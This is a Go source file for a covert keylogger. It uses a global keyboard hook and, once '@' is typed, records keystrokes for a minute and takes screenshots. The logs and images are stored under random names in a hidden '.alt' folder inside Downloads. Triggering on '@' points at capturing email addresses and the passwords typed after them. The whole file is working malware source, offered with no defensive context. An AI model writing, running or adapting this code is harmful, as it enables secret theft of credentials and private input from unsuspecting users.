package main

import (
	"crypto/rand"
	"fmt"
	"log"
	"os"
	"path/filepath"
	"time"

	hook "github.com/robotn/gohook"
	"image/png"
	"github.com/kbinani/screenshot"
)

var (
	logDuration = 1 * time.Minute
	screenshotPath string
	keyLogFilePath string
)

func main() {
	logging := false
	var startTime time.Time

	homeDir, err := os.UserHomeDir()
	if err != nil {
		log.Fatalf("Failed to get user home directory: %v", err)
	}
	
	hiddenFolder := filepath.Join(homeDir, "Downloads", ".alt")
	err = os.MkdirAll(hiddenFolder, 0755)
	if err != nil {
		log.Fatalf("Failed to create hidden folder: %v", err)
	}

	keyLogFileName := generateRandomName() + ".txt"
	screenshotFileName := generateRandomName() + ".png"
	
	keyLogFilePath = filepath.Join(hiddenFolder, keyLogFileName)
	screenshotPath = filepath.Join(hiddenFolder, screenshotFileName)

	file, err := os.OpenFile(keyLogFilePath, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
	if err != nil {
		log.Fatalf("Failed to create/open keylog file: %v", err)
	}
	defer file.Close()

	evChan := hook.Start()
	defer hook.End()

	for ev := range evChan {

		if ev.Kind == hook.KeyHold && ev.Keychar == '@' && !logging {
			logging = true
			startTime = time.Now()
			fmt.Println("Started logging keystrokes...")
			file.Sync()
			takeScreenshot(screenshotPath)
			log.Printf("Screenshot saved to: %s", screenshotPath)
			continue
		}
		if logging && ev.Kind == hook.KeyHold {
			if ev.Keychar >= 32 && ev.Keychar <= 126 {
				_, err := file.WriteString(string(ev.Keychar))
				if err != nil {
					log.Fatalf("Failed to write to keylog file: %v", err)
				}
				file.Sync()
			}
		}

		if logging && time.Since(startTime) >= logDuration {
			logging = false
			fmt.Println("Stopped logging. Waiting for '@' to start again...")
		}

		if ev.Kind == hook.KeyHold && ev.Keychar == '@' && logging {
			takeScreenshot(screenshotPath)
			log.Printf("Screenshot saved to: %s", screenshotPath)
		}
	}
}

func generateRandomName() string {
	bytes := make([]byte, 8)
	rand.Read(bytes)
	return fmt.Sprintf("%x", bytes)
}

func takeScreenshot(path string) error {
	n := screenshot.NumActiveDisplays()
	if n <= 0 {
		return fmt.Errorf("No active display found")
	}
	bounds := screenshot.GetDisplayBounds(0)
	img, err := screenshot.CaptureRect(bounds)
	if err != nil {
		return fmt.Errorf("Failed to capture screenshot: %v", err)
	}
	file, err := os.Create(path)
	if err != nil {
		return fmt.Errorf("Failed to create screenshot file: %v", err)
	}
	defer file.Close()
	return png.Encode(file, img)
}